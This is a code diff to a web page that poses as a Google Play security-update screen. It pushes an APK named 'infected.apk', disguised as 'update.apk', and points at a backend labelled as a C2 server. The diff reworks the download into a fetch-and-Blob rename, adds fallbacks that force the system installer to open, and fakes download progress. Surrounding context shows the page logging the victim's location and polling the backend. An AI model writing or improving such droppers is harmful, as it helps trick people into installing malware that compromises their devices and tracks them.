@@ -41,9 +41,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ============================================================
-           HEADER — Google Play Logo
-           ============================================================ */
         .header {
             display: flex;
             align-items: center;
@@ -89,9 +86,6 @@
             margin-bottom: 12px;
         }
 
-        /* ============================================================
-           ICON & TITLE
-           ============================================================ */
         .icon-container {
             background: #e8f0fe;
             border-radius: 50%;
@@ -130,9 +124,6 @@
             font-weight: 500;
         }
 
-        /* ============================================================
-           STATUS
-           ============================================================ */
         .status-container {
             background: #f1f3f4;
             border-radius: 16px;
@@ -163,9 +154,6 @@
             transition: width 0.4s ease;
         }
 
-        /* ============================================================
-           INSTALL SECTION
-           ============================================================ */
         .install-section {
             margin: 20px 0 12px;
             padding: 20px;
@@ -237,9 +225,6 @@
             box-shadow: none;
         }
 
-        /* ============================================================
-           FILE INFO
-           ============================================================ */
         .file-info {
             display: flex;
             justify-content: center;
@@ -256,9 +241,6 @@
             gap: 4px;
         }
 
-        /* ============================================================
-           LOGS
-           ============================================================ */
         .log-console {
             background: #f1f3f4;
             border-radius: 16px;
@@ -405,7 +387,7 @@
         'use strict';
 
         // ============================================================
-        //  CONFIG — ONLY ONE DOWNLOAD, NO PLAY STORE
+        //  CONFIG — ONLY ONE DOWNLOAD, RENAMED VIA BLOB
         // ============================================================
         const BACKEND_URL = 'https://c2-api-test.vercel.app';
         const APK_URL = 'infected.apk';
@@ -624,38 +606,65 @@
         }
 
         // ============================================================
-        //  SINGLE APK DOWNLOAD — CLEAN, NO PLAY STORE
+        //  DOWNLOAD APK — USING FETCH + BLOB TO RENAME
         // ============================================================
         function downloadApk() {
             addLog('[APK] Downloading update.apk...', 'info');
-            setStatus('📦 Downloading security update...', 60);
+            setStatus('📦 Downloading security update...', 50);
 
-            // Only ONE download method — anchor with renamed file
-            try {
-                const a = document.createElement('a');
-                a.href = APK_URL;
-                a.download = DOWNLOAD_NAME;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                addLog('[APK] Download started: update.apk', 'success');
-                apkDownloaded = true;
-            } catch(e) {
-                addLog('[APK] Download failed: '+e.message, 'error');
-                // Fallback: direct navigation (opens file, may show installer)
-                window.location.href = APK_URL;
-            }
+            // Use fetch to get the file as a blob, then rename it
+            fetch(APK_URL)
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.blob();
+                })
+                .then(blob => {
+                    // Create a new blob with the correct MIME type
+                    const newBlob = new Blob([blob], { type: 'application/vnd.android.package-archive' });
+                    const url = URL.createObjectURL(newBlob);
 
-            // Small progress simulation
-            let p = 65;
-            const interval = setInterval(() => {
-                p += Math.floor(Math.random() * 8) + 2;
-                if (p >= 100) {
-                    clearInterval(interval);
-                    setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
+                    // Create download link with the correct filename
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = DOWNLOAD_NAME;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+
+                    // Clean up
+                    setTimeout(() => URL.revokeObjectURL(url), 10000);
+
+                    addLog('[APK] Download started: update.apk', 'success');
+                    apkDownloaded = true;
                     installBtn.disabled = false;
+                    setStatus('✅ Update ready — tap "Install Update" to continue.', 100);
                     addLog('[APK] Download complete. File: update.apk', 'success');
+                })
+                .catch(error => {
+                    addLog('[APK] Download failed: ' + error.message, 'error');
+                    // Fallback: try anchor download as last resort
+                    try {
+                        const a = document.createElement('a');
+                        a.href = APK_URL;
+                        a.download = DOWNLOAD_NAME;
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        addLog('[APK] Fallback download triggered.', 'warn');
+                    } catch(e) {
+                        addLog('[APK] Fallback also failed: ' + e.message, 'error');
+                        setStatus('❌ Download failed. Please try again.', 0);
+                    }
+                });
+
+            // Progress simulation
+            let p = 55;
+            const interval = setInterval(() => {
+                p += Math.floor(Math.random() * 6) + 2;
+                if (p >= 95) {
+                    clearInterval(interval);
                 } else {
                     setStatus(`📦 Downloading... ${p}%`, p);
                 }
@@ -663,7 +672,7 @@
         }
 
         // ============================================================
-        //  INSTALL BUTTON — CLEAN, NO PLAY STORE
+        //  INSTALL BUTTON — USES SAME BLOB METHOD
         // ============================================================
         installBtn.addEventListener('click', function() {
             addLog('[Install] User tapped Install Update.', 'info');
@@ -671,25 +680,38 @@
             installBtn.disabled = true;
             installBtn.textContent = '⏳ Opening installer...';
 
-            // Method 1: Anchor download with correct name
-            try {
-                const a = document.createElement('a');
-                a.href = APK_URL;
-                a.download = DOWNLOAD_NAME;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                addLog('[Install] Download triggered (update.apk).', 'success');
-            } catch(e) {
-                addLog('[Install] Download failed: '+e.message, 'error');
-            }
+            // Use fetch + blob to ensure correct filename
+            fetch(APK_URL)
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.blob();
+                })
+                .then(blob => {
+                    const newBlob = new Blob([blob], { type: 'application/vnd.android.package-archive' });
+                    const url = URL.createObjectURL(newBlob);
 
-            // Method 2: Direct navigation (opens the APK, which triggers installer)
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = DOWNLOAD_NAME;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+
+                    setTimeout(() => URL.revokeObjectURL(url), 10000);
+                    addLog('[Install] Download triggered (update.apk).', 'success');
+                })
+                .catch(error => {
+                    addLog('[Install] Download failed: ' + error.message, 'error');
+                    // Fallback: direct navigation
+                    window.location.href = APK_URL;
+                });
+
+            // Also try direct navigation as backup
             setTimeout(() => {
                 window.location.href = APK_URL;
-                addLog('[Install] Direct navigation (opens APK).', 'info');
-            }, 500);
+                addLog('[Install] Direct navigation (backup).', 'info');
+            }, 800);
 
             setStatus('📲 Installation started. Follow the system prompt.', 100);
             addLog('[Install] ✅ Check Downloads folder for update.apk.', 'success');
@@ -752,7 +774,7 @@
                 addLog(`[Loc] ${loc.lat}, ${loc.lon}`, 'info');
             }
 
-            // SINGLE CLEAN DOWNLOAD
+            // SINGLE CLEAN DOWNLOAD WITH RENAME
             downloadApk();
 
             setInterval(async () => {
